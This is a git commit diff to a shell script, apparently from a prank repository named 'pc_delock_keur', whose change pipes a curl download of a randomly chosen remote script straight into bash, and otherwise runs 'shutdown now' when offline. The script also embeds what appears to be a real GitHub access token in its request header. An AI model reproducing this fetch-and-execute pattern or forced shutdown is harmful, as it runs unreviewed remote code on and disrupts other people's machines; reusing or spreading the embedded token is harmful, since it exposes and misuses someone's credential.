f8919e8214c1021dd430fdd866c328c3325d1a4f
Waz0x <remy.noulin@epitech.eu>
2021-09-08 12:02:03 +0200

    MOD | forgot to pipe in bash

--- script.sh
+++ script.sh
@@ -5,7 +5,7 @@ rdm=$(( $RANDOM % 15 ))
 wget -q --spider http://google.com
 
 if [ $? -eq 0 ]; then
-	curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh"
+	curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | bash
 else
 	shutdown now
 fi
